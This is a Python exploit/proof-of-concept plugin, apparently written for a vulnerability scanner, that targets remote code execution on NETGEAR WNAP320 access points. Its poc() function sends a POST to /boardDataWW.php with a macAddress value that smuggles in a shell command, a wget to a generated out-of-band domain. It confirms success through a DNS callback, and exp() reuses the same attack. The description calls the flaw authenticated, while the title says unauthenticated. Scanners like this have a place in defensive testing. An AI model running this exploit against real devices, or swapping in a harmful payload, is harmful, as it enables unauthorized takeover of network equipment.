import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''NETGEAR WNAP320 Access Point - Remote Code Execution (Unauthenticated)''',
        "description": '''vulnerabilities in the web-based management interface of NETGEAR WNAP320 Access Point could allow an authenticated, remote attacker to perform command injection attacks against an affected device.''',
        "severity": "critical",
        "references": [
            "https://github.com/nobodyatall648/Netgear-WNAP320-Firmware-Version-2.0.3-RCE"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["netgear", "rce", "oast", "router"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/boardDataWW.php"""
        method = "POST"
        data = """macAddress=112233445566%3Bwget+http%3A%2F%2F{oob_domain}%23&reginfo=0&writeData=Submit""".format(oob_domain=oob_domain)
        headers = {'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url